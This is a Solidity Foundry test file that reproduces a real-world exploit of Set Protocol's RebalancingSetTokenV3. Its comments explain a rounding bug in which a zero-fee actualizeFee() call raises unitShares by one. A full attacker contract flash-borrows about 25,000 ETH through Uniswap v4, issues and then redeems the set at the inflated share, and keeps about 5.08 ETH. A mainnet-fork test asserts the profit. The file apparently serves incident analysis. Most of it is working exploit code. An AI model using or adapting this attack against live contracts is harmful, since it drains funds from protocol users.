// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

import "forge-std/Test.sol";

// Set Protocol - RebalancingSetTokenV3.actualizeFee() unit-share rounding manipulation,
// amplified by a Uniswap v4 native-ETH flash-accounting loan. Ethereum, Oct 2026. ~5.08 ETH.
//
// Exploit tx : 0xaca5f83ff3a206209f3d213c33d04e6febe345f6ad52ef476bd1c0ee1505ba65 (block 26131887)
// Attacker   : 0x506440728D84eB22809DC9464bC8189618A1c5B6 (EOA)
//              0x016Feaaa25aB8325e233BC8A2C25055BEe0B2F6E (one-shot attack contract)
//
// Root cause (confirmed against the verified sources, not just the alert):
//   RebalancingSetTokenV3 (0x54e8...) stores `unitShares`, the amount of the backing currentSet
//   held per naturalUnit of rebalancing-set supply. Issuance sets it via FLOOR division
//   (calculateNextSetNewUnitShares -> `_issueQuantity.div(naturalUnitsOutstanding)`), so after an
//   issue the stored value is rounded down (here 4927).
//
//   actualizeFee() is public and only requires Default state. It calls IncentiveFee.handleFees()
//   (which mints nothing when the incentive fee is 0) and then UNCONDITIONALLY overwrites
//   unitShares with:
//       calculateNewUnitShares() = currentSetAmount.mul(naturalUnit).divCeil(totalSupply())
//   divCeil ROUNDS UP. With no fee minted, totalSupply and the vault's currentSet balance are
//   unchanged, yet the ceil re-derivation bumps the stored floor value up by one: 4927 -> 4928.
//   The real tx confirms this: FeeActualization(profitFee: 0, streamingFee: 0) and
//   IncentiveFeePaid(..., newUnitShares: 4928). A fee of zero still moved the unit share.
//
//   Core.issue/redeem are permissionless and read the live unitShares. Issuing the rebalancing set
//   costs 4927 currentSet per naturalUnit; redeeming the same quantity AFTER actualizeFee pays out
//   4928 per naturalUnit. The 1-unit gap per naturalUnit, over the issued quantity, is pure profit:
//       extra currentSet = RSET_QTY / naturalUnit * 1 = 37872.408793e18 / 1e6 = 0.037872408793e18
//   which redeems back to ~5.083 ETH once the currentSet is unwound to WETH.
//
// Uniswap v4 role: the gain is proportional to the issue/redeem size, so to turn a 1-unit rounding
// edge into 5 ETH the attacker needs ~25,000 ETH of working capital for one atomic block. It is
// borrowed fee-free through v4 flash accounting: PoolManager.unlock -> unlockCallback ->
// take(native ETH) ... -> settle{value}. No pool swap, just the transient debt primitive.
//
// Real sequence inside the unlock callback (values from the tx trace):
//   take(ETH, 25044.673458) ; WETH.deposit ; approve TransferProxy (WETH + base set)
//   Core.issue(baseSet, 186.597358123111e18)      -> pulls 25044.673458 WETH, mints base set
//   Core.issue(rSet,    37872.408793e18)          -> pulls base set at unitShares 4927
//   rSet.actualizeFee()                           -> unitShares 4927 -> 4928, zero fee
//   Core.redeem(rSet,   37872.408793e18)          -> releases base set at 4928 (more than paid)
//   Core.withdraw(baseSet) ; Core.redeem(baseSet) -> 186.635230531904e18 base set -> WETH
//   Core.withdraw(WETH, 25049.756606748386e18)    -> 25044.673458 flash + 5.083148 profit
//   WETH.withdraw ; PoolManager.settle{value: 25044.673458} ; keep 5.083148 ETH
//
// Permissionless: PoolManager.unlock, Core.issue/redeem/withdraw and RebalancingSetTokenV3
// .actualizeFee() are all callable by anyone; actualizeFee's only gate is Default rebalance state,
// which holds here. No owner/governance/role/signature stands in the attacker's path.
//
// This reconstruction drives the real contracts with typed calls (no create()-deployed attacker
// bytecode, no raw calldata replay). Issue quantities are the attacker's real inputs; withdraw
// amounts are read live from the Vault so the +1 unitShare surplus is what carries through.
//
// Run (self-contained mainnet archive fork; cancun required for v4 transient storage):
//   forge test --contracts ./src/test/2026-10/SetProtocol_exp.sol --evm-version cancun -vvv

interface IWETH {
    function deposit() external payable;
    function withdraw(uint256) external;
    function approve(address, uint256) external returns (bool);
    function balanceOf(address) external view returns (uint256);
}

interface IERC20 {
    function approve(address, uint256) external returns (bool);
    function balanceOf(address) external view returns (uint256);
}

// Uniswap v4 singleton
interface IPoolManager {
    function unlock(bytes calldata data) external returns (bytes memory);
    function take(address currency, address to, uint256 amount) external;
    function settle() external payable returns (uint256);
}

// Set Protocol v1 Core (issuance/redemption + vault deposit/withdraw)
interface ICore {
    function issue(address set, uint256 quantity) external;
    function redeem(address set, uint256 quantity) external;
    function withdraw(address token, uint256 quantity) external;
}

interface IRebalancingSetToken {
    function actualizeFee() external;
    function unitShares() external view returns (uint256);
    function naturalUnit() external view returns (uint256);
    function currentSet() external view returns (address);
}

interface IVault {
    function getOwnerBalance(address token, address owner) external view returns (uint256);
}

contract SetAttacker {
    IPoolManager internal constant POOL_MANAGER = IPoolManager(0x000000000004444c5dc75cB358380D2e3dE08A90);
    IWETH internal constant WETH = IWETH(0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2);
    uint256 internal constant MAX = type(uint256).max;

    ICore internal immutable core;
    IVault internal immutable vault;
    address internal immutable transferProxy;
    IRebalancingSetToken internal immutable rSet;
    IERC20 internal immutable baseSet;

    // Real attacker inputs from the tx.
    uint256 internal constant FLASH_WETH = 25_044_673_458_086_302_711_808; // ~25044.67 ETH
    uint256 internal constant BASE_SET_QTY = 186_597_358_123_111_000_000; // base SetToken issued
    uint256 internal constant RSET_QTY = 37_872_408_793_000_000_000_000; // rebalancing set issued

    // Observed unit-share bump, exposed for the test to assert.
    uint256 public unitSharesBefore;
    uint256 public unitSharesAfter;

    constructor(address _core, address _vault, address _transferProxy, address _rSet) {
        core = ICore(_core);
        vault = IVault(_vault);
        transferProxy = _transferProxy;
        rSet = IRebalancingSetToken(_rSet);
        baseSet = IERC20(IRebalancingSetToken(_rSet).currentSet());
    }

    function run() external {
        POOL_MANAGER.unlock("");
    }

    function unlockCallback(bytes calldata) external returns (bytes memory) {
        require(msg.sender == address(POOL_MANAGER), "only pm");

        // 1. Flash-borrow native ETH via v4 flash accounting (transient debt, settled at the end).
        POOL_MANAGER.take(address(0), address(this), FLASH_WETH);
        WETH.deposit{value: FLASH_WETH}();

        // 2. Approvals for the TransferProxy to pull components into the Vault.
        WETH.approve(transferProxy, MAX);
        baseSet.approve(transferProxy, MAX);

        // 3. Issue the base SetToken (pulls FLASH_WETH), then the rebalancing set at unitShares=4927.
        core.issue(address(baseSet), BASE_SET_QTY);
        unitSharesBefore = rSet.unitShares();
        core.issue(address(rSet), RSET_QTY);

        // 4. The bug: zero-fee actualizeFee re-ceils unitShares upward (4927 -> 4928).
        rSet.actualizeFee();
        unitSharesAfter = rSet.unitShares();

        // 5. Redeem the rebalancing set at the inflated unitShares -> more base set than was paid in.
        core.redeem(address(rSet), RSET_QTY);
        core.withdraw(address(baseSet), vault.getOwnerBalance(address(baseSet), address(this)));

        // 6. Unwind the base set back to WETH and pull it out of the Vault.
        core.redeem(address(baseSet), baseSet.balanceOf(address(this)));
        core.withdraw(address(WETH), vault.getOwnerBalance(address(WETH), address(this)));

        // 7. Repay the flash: unwrap exactly the borrowed amount and settle the native debt.
        WETH.withdraw(FLASH_WETH);
        POOL_MANAGER.settle{value: FLASH_WETH}();

        // Remaining WETH is the surplus from the +1 unitShare; unwrap it to ETH as profit.
        WETH.withdraw(WETH.balanceOf(address(this)));
        return "";
    }

    function sweep(address to) external {
        (bool ok,) = to.call{value: address(this).balance}("");
        require(ok, "sweep");
    }

    receive() external payable {}
}

contract SetProtocol_exp is Test {
    uint256 internal constant ATTACK_BLOCK = 26131887;
    uint256 internal constant EXPECTED_PROFIT = 5_083_148_662_083_682_304; // ~5.0831 ETH

    address internal constant CORE = 0xf55186CC537E7067EA616F2aaE007b4427a120C8;
    address internal constant VAULT = 0x5B67871C3a857dE81A1ca0f9F7945e5670D986Dc;
    address internal constant TRANSFER_PROXY = 0x882d80D3a191859d64477eb78Cca46599307ec1C;
    address internal constant RSET = 0x54e8371C1EC43e58fB53D4ef4eD463C17Ba8a6bE;

    string internal constant MAINNET_ARCHIVE = "https://eth-mainnet.public.blastapi.io";

    address internal attacker = makeAddr("attacker");

    function setUp() public {
        vm.createSelectFork(MAINNET_ARCHIVE, ATTACK_BLOCK - 1);
    }

    function testExploit() public {
        SetAttacker atk = new SetAttacker(CORE, VAULT, TRANSFER_PROXY, RSET);

        atk.run();
        atk.sweep(attacker);

        emit log_named_uint("unitShares before actualizeFee", atk.unitSharesBefore());
        emit log_named_uint("unitShares after  actualizeFee", atk.unitSharesAfter());
        assertEq(atk.unitSharesBefore(), 4927, "pre-bump unitShares");
        assertEq(atk.unitSharesAfter(), 4928, "post-bump unitShares");

        uint256 profit = attacker.balance;
        emit log_named_decimal_uint("ETH profit", profit, 18);
        assertApproxEqRel(profit, EXPECTED_PROFIT, 0.01e18);
    }
}
